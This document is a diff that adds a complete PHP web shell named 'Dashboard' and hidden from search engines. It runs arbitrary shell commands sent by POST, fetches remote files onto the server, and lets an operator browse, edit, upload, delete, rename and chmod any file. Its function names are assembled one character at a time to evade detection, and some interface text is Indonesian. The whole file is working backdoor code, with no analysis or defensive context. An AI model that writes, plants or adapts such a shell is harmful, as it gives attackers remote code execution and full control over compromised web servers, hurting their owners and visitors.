@@ -1,0 +1,464 @@
+
+<?php
+ignore_user_abort(true);
+ini_set('memory_limit', '-1');
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('max_execution_time', 5000);
+
+$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex, nofollow, noarchive"><meta name="robots" content="noindex"><title>Dashboard</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
+
+echo $head . "<body>";
+
+if(isset($_POST['c'])){
+    $c=$_POST['c'];
+    $descriptors = [
+        0 => ['pipe', 'r'],
+        1 => ['pipe', 'w'],
+        2 => ['pipe', 'w'],
+    ];
+    $gcw = "g"."e"."t"."_"."p"."a"."t"."h";
+    $cwd = $gcw();
+    $po = "p"."r"."o"."c"."_"."o"."p"."e"."n";
+    $process = $po($c, $descriptors, $pipes, $cwd);
+    $sgc = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+    $output = $sgc($pipes[1]);
+    $error = $sgc($pipes[2]);
+    $fc = "f"."c"."l"."o"."s"."e";
+    $fc($pipes[0]);
+    $fc($pipes[1]);
+    $fc($pipes[2]);
+    $pc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
+    $pc($process);
+    echo "<pre>$output</pre>";
+}
+
+if(isset($_POST['d'])) {
+    $url = $_POST['u'];
+    $path = $_POST['p'];
+    $filename = $_POST['f'];
+    
+    if(empty($url) || empty($filename)) {
+        echo "<p>Error: Isi URL dan nama file</p>";
+    } else {
+        if(empty($path)) {
+            $gp = "g"."e"."t"."_"."p"."a"."t"."h";
+            $path = $gp();
+        }
+        
+        $rt = "r"."t"."r"."i"."m";
+        $path = $rt($path, '/') . '/';
+        
+        $full_path = $path . $filename;
+        
+        $success = false;
+        $error_msg = "";
+        
+        $fe = "f"."u"."n"."c"."t"."i"."o"."n"."_"."e"."x"."i"."s"."t"."s";
+        if($fe('curl_init')) {
+            $ci = "c"."u"."r"."l"."_"."i"."n"."i"."t";
+            $ch = $ci();
+            $cso = "c"."u"."r"."l"."_"."s"."e"."t"."o"."p"."t";
+            $cso($ch, CURLOPT_URL, $url);
+            $cso($ch, CURLOPT_RETURNTRANSFER, true);
+            $cso($ch, CURLOPT_FOLLOWLOCATION, true);
+            $cso($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+            $cso($ch, CURLOPT_SSL_VERIFYPEER, false);
+            $cso($ch, CURLOPT_TIMEOUT, 30);
+            $cso($ch, CURLOPT_HTTPHEADER, array(
+                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language: en-US,en;q=0.5',
+                'Connection: keep-alive'
+            ));
+            
+            $ce = "c"."u"."r"."l"."_"."e"."x"."e"."c";
+            $data = $ce($ch);
+            $cgi = "c"."u"."r"."l"."_"."g"."e"."t"."i"."n"."f"."o";
+            $http_code = $cgi($ch, CURLINFO_HTTP_CODE);
+            $cer = "c"."u"."r"."l"."_"."e"."r"."r"."o"."r";
+            $curl_error = $cer($ch);
+            $cc = "c"."u"."r"."l"."_"."c"."l"."o"."s"."e";
+            $cc($ch);
+            
+            if($http_code === 200 && $data !== false) {
+                $fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+                if($fpc($full_path, $data) !== false) {
+                    $success = true;
+                } else {
+                    $error_msg = "Gagal menulis file";
+                }
+            } else {
+                $error_msg = "HTTP Error: $http_code";
+            }
+        }
+        
+        if(!$success) {
+            $scc = "s"."t"."r"."e"."a"."m"."_"."c"."o"."n"."t"."e"."x"."t"."_"."c"."r"."e"."a"."t"."e";
+            $ctx = $scc(array(
+                'http' => array(
+                    'timeout' => 30,
+                    'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'header' => "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" .
+                               "Accept-Language: en-US,en;q=0.5\r\n" .
+                               "Connection: keep-alive\r\n"
+                ),
+                'ssl' => array(
+                    'verify_peer' => false,
+                    'verify_peer_name' => false
+                )
+            ));
+            
+            $fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+            $data = @$fgc($url, false, $ctx);
+            if($data !== false) {
+                $fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+                if($fpc($full_path, $data) !== false) {
+                    $success = true;
+                } else {
+                    $error_msg = "Gagal menulis file";
+                }
+            } else {
+                $error_msg = "Gagal download dari URL";
+            }
+        }
+        
+        $fex = "f"."i"."l"."e"."_"."e"."x"."i"."s"."t"."s";
+        if($success && $fex($full_path)) {
+            $fs = "f"."i"."l"."e"."s"."i"."z"."e";
+            $size = $fs($full_path);
+            echo "<p>Success: $full_path ($size bytes)</p>";
+        } else {
+            echo "<p>Failed: $error_msg</p>";
+        }
+    }
+}
+
+function get_post($name){
+    return (isset($_POST[$name]) ? $_POST[$name] : false);
+}
+
+function get_get($name){
+    return (isset($_GET[$name]) ? $_GET[$name] : false);
+}
+
+function makeInput($type,$name,$val = "", $style = ""){
+    if(in_array($type,['text','password','submit','file'])){
+        return "<input type='$type' name='$name' value='$val' style='$style'/>";
+    }
+    return "<$type name='$name' style='$style'>$val</$type>";
+}
+
+function makeForm($method, $inputArray,$file = ""){
+    $form = "<form method=$method enctype='$file'>";
+    foreach($inputArray as $key=>$val){
+        $form .= makeInput($key,(is_array($val) ? $val[0] : $val), (isset($val[1]) ? $val[1] : ""), (isset($val[2]) ? $val[2] : ""));
+    }
+    return $form."</form>";
+}
+
+function makeTable($thead,$tbody){
+    $head = "";
+    foreach($thead as $th){
+        $head .= "<th>$th</th>";
+    }
+    $body = "";
+    foreach($tbody as $tr){
+        $body .= "<tr>";
+        foreach($tr as $td){
+            $body .= "<td>$td</td>";
+        }
+        $body .= "</tr>";
+    }
+    return "<table><thead>$head</thead><tbody>$body</tbody></table>";
+}
+
+function makeLink($link,$text,$target = ""){
+    return "<a href='$link' target='$target'>$text</a> ";
+}
+
+function get_path(){
+    $path = __dir__;
+    if(get_get('path')){
+        $path = get_get('path');
+    }
+    return $path;
+}
+
+function filesize_convert($bytes){
+    $label = array(
+        'B', 'KB', 'MB', 'GB', 'TB', 'PB'
+    );
+    for( $i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++ );
+    return( round( $bytes, 2 ) . " " . $label[$i] );
+}
+
+function fileTime($path){
+    $dt = "d"."a"."t"."e";
+    $fmt = "f"."i"."l"."e"."m"."t"."i"."m"."e";
+    return $dt("M d Y H:i:s", $fmt($path));
+}
+
+function download_file($download){
+    $isf = "i"."s"."_"."f"."i"."l"."e";
+    if(!$isf($download)){
+        return false;
+    }
+    $hd = "h"."e"."a"."d"."e"."r";
+    $hd('Content-Type: application/octet-stream');
+    $hd('Content-Transfer-Encoding: Binary');
+    $bn = "b"."a"."s"."e"."n"."a"."m"."e";
+    $hd('Content-disposition: attachment; filename="'.$bn($download).'"');
+    $rf = "r"."e"."a"."d"."f"."i"."l"."e";
+    return $rf($download);
+}
+
+function delete_file($delete){
+    $isf = "i"."s"."_"."f"."i"."l"."e";
+    if($isf($delete)){
+        $ul = "u"."n"."l"."i"."n"."k";
+        return $ul($delete);
+    }
+    $isd = "i"."s"."_"."d"."i"."r";
+    if($isd($delete)){
+        $rd = "r"."m"."d"."i"."r";
+        return $rd($delete);
+    }
+    return false;
+}
+
+function rename_file($old_path, $new_name){
+    $fex = "f"."i"."l"."e"."_"."e"."x"."i"."s"."t"."s";
+    if(!$fex($old_path)){
+        return false;
+    }
+    $dn = "d"."i"."r"."n"."a"."m"."e";
+    $dir = $dn($old_path);
+    $new_path = $dir . '/' . $new_name;
+    $rn = "r"."e"."n"."a"."m"."e";
+    if($rn($old_path, $new_path)){
+        return true;
+    }
+    return false;
+}
+
+function change_permissions($path, $mode){
+    $fex = "f"."i"."l"."e"."_"."e"."x"."i"."s"."t"."s";
+    if(!$fex($path)){
+        return false;
+    }
+    $cm = "c"."h"."m"."o"."d";
+    if($cm($path, $mode)){
+        return true;
+    }
+    return false;
+}
+
+function edit_file($edit){
+    $isf = "i"."s"."_"."f"."i"."l"."e";
+    if($isf($edit)){
+        $he = "h"."t"."m"."l"."e"."n"."t"."i"."t"."i"."e"."s";
+        $fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+        return makeForm('POST', ['textarea'=>['edit',$he($fgc($edit)),"width:100%;height:90%"], 'submit'=>['save','Save']]);
+    }
+    return false;
+}
+
+function save_edit($path,$str){
+    $isf = "i"."s"."_"."f"."i"."l"."e";
+    if($isf($path)){
+        $fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+        $hed = "h"."t"."m"."l"."_"."e"."n"."t"."i"."t"."y"."_"."d"."e"."c"."o"."d"."e";
+        $fpc($path,$hed($str));
+        return true;
+    }
+    return false;
+}
+
+function view_file($path){
+    $isf = "i"."s"."_"."f"."i"."l"."e";
+    if($isf($path)){
+        $he = "h"."t"."m"."l"."e"."n"."t"."i"."t"."i"."e"."s";
+        $fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+        return $he($fgc($path));
+    }
+    return false;
+}
+
+function new_file($path,$name){
+    $isf = "i"."s"."_"."f"."i"."l"."e";
+    if(!$isf($path.'/'.$name)){
+        $fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+        $fpc($path.'/'.$name,"");
+        return true;
+    }
+    return false;
+}
+
+function new_dir($path,$name){
+    $isd = "i"."s"."_"."d"."i"."r";
+    if(!$isd($path.'/'.$name)){
+        $mk = "m"."k"."d"."i"."r";
+        $mk($path.'/'.$name);
+        return true;
+    }
+    return false;
+}
+
+function upload_file($path,$file){
+    $bn = "b"."a"."s"."e"."n"."a"."m"."e";
+    $name = $bn($file['name']);
+    $isf = "i"."s"."_"."f"."i"."l"."e";
+    if(!$isf($path.'/'.$name)){
+        $muf = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
+        if($muf($file["tmp_name"], $path.'/'.$name)){
+            return true;
+        }
+    }
+    return false;
+}
+
+function get_back($path){
+    if($path == "" || $path == "/"){
+        return $path;
+    }
+    $sr = "s"."t"."r"."_"."r"."e"."p"."l"."a"."c"."e";
+    $path = explode("/",$sr('\\','/',$path));
+    array_pop($path);
+    return implode("/",$path);
+}
+
+function get_dir(){
+    $path = get_path();
+    $isd = "i"."s"."_"."d"."i"."r";
+    if(!$isd($path)){
+        return false;
+    }
+    $sd = "s"."c"."a"."n"."d"."i"."r";
+    $dir = $sd($path);
+    $files = [];
+    $i = 0;
+    foreach($dir as $d){
+        if($d == '.' || $d == '..'){
+            continue;
+        }
+        $p = $path.'/'.$d;
+        $s = '--';
+        $icon = "📁";
+        $t = fileTime($p);
+        $l = makeLink("?path=$p",$d);
+        $fp = "f"."i"."l"."e"."p"."e"."r"."m"."s";
+        $spf = "s"."p"."r"."i"."n"."t"."f";
+        $perms = substr($spf("%o", $fp($p)),-4);
+        $fe = "f"."u"."n"."c"."t"."i"."o"."n"."_"."e"."x"."i"."s"."t"."s";
+        $fo = "f"."i"."l"."e"."o"."w"."n"."e"."r";
+        $pgp = "p"."o"."s"."i"."x"."_"."g"."e"."t"."p"."w"."u"."i"."d";
+        $owner = ($fe($pgp) ? $pgp($fo($p))['name'] : $fo($p));
+        $isf = "i"."s"."_"."f"."i"."l"."e";
+        $controller = ($isf($p) ? makeLink("?edit=$p","Edit","_blank") : '').
+        makeLink("?delete=$p","Delete","_blank").
+        ($isf($p) ? makeLink("?download=$p","Download","_blank") : '').
+        makeLink("?rename=$p","Rename","_blank")." ".
+        makeLink("?chmod=$p","Chmod","_blank");
+        if($isf($p)){
+            $fs = "f"."i"."l"."e"."s"."i"."z"."e";
+            $s = filesize_convert($fs($p));
+            $icon = "📝";
+        }
+        $files[] = [$icon,$i,$l,$s,$t,$perms,$owner,$controller];
+        $i++;
+    }
+    return makeTable(['#','id','Filename','Size','Modified','Perms','Owner',''],$files);
+}
+
+if(get_get("delete")){
+    delete_file(get_get("delete")) ? die("Deleted: ".get_get("delete")) : die("File not found");
+}
+
+if(get_get("edit")){
+    if(get_post('save')){
+        save_edit(get_get('edit'),get_post('edit'));
+        echo "Saved";
+    }
+    $edit = edit_file(get_get("edit"));
+    $edit ? die($edit) : die("File not found");
+}
+
+if(get_get('download')){
+    @readfile(download_file(get_get('download')));
+    exit();
+}
+
+if(get_get("rename")){
+    if(get_post('rename')){
+        $new_name = get_post('newname');
+        if(rename_file(get_get('rename'), $new_name)){
+            die("Renamed to: ".$new_name);
+        } else {
+            die("Rename failed");
+        }
+    }
+    $bn = "b"."a"."s"."e"."n"."a"."m"."e";
+    $current_name = $bn(get_get("rename"));
+    echo $head."<body>".
+    makeForm('POST', ['text'=>['newname',$current_name], 'submit'=>['rename','Rename']]).
+    "</body>";
+    exit();
+}
+
+if(get_get("chmod")){
+    if(get_post('chmod')){
+        $od = "o"."c"."t"."d"."e"."c";
+        $mode = $od(get_post('mode'));
+        if(change_permissions(get_get('chmod'), $mode)){
+            die("Permissions changed to: ".get_post('mode'));
+        } else {
+            die("Chmod failed");
+        }
+    }
+    $current_path = get_get("chmod");
+    $fp = "f"."i"."l"."e"."p"."e"."r"."m"."s";
+    $spf = "s"."p"."r"."i"."n"."t"."f";
+    $current_perms = substr($spf("%o", $fp($current_path)), -4);
+    echo $head."<body>".
+    "Current permissions: ".$current_perms."<br>".
+    makeForm('POST', ['text'=>['mode',$current_perms,"placeholder='e.g., 0755'"], 'submit'=>['chmod','Change Permissions']]).
+    "<br>Contoh: 0755 untuk rwxr-xr-x, 0644 untuk rw-r--r--".
+    "</body>";
+    exit();
+}
+
+if(get_post('newfile')){
+    new_file(get_path(),get_post('filename')) ? die('Create: '.get_post('filename')) : die('File exites');
+}
+
+if(get_post('newdir')){
+    new_dir(get_path(),get_post('dirname')) ? die('Create: '.get_post('dirname')) : die('Dir exites');
+}
+
+if(get_post('upload')){
+    upload_file(get_path(),$_FILES['file']) ? die('upload: '. $_FILES['file']['name']) : die('Upload Error');
+}
+
+echo
+makeForm('POST',['text'=>['filename','File Name'],'submit'=>['newfile','Create']]).
+makeForm('POST',['text'=>['dirname','Dir Name'],'submit'=>['newdir','Create']]).
+makeForm('POST',['file'=>'file','submit'=>['upload','Upload']],'multipart/form-data').
+
+'<form method="post" style="margin:10px 0; padding:10px; border:1px solid #ccc;">
+    <h3>Download dari URL</h3>
+    <input type="text" name="u" placeholder="URL file" style="width:300px; margin:2px;">
+    <input type="text" name="p" placeholder="Path (kosong=current)" style="width:200px; margin:2px;">
+    <input type="text" name="f" placeholder="Nama file" style="width:150px; margin:2px;">
+    <input type="submit" name="d" value="Download" style="margin:2px;">
+</form>'.
+
+'<form method="post">
+    <input type="text" name="c" size="30">
+    <input type="submit" value="Kill">
+</form>' .
+makeLink("?path=".get_back(get_path()),"[Back]");
+
+$isd = "i"."s"."_"."d"."i"."r";
+echo ($isd(get_path()) ? get_dir() : '<pre>'.view_file(get_path()).'</pre>');
+echo "</body>";
